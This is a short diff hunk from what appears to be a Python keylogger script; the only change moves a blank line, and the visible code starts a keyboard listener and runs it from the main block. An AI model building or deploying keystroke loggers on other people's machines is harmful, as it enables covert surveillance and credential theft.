@@ -45,7 +45,7 @@ def log_keystrokes():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
-
 # Run the key logger
 if __name__ == "__main__":
     log_keystrokes()
+
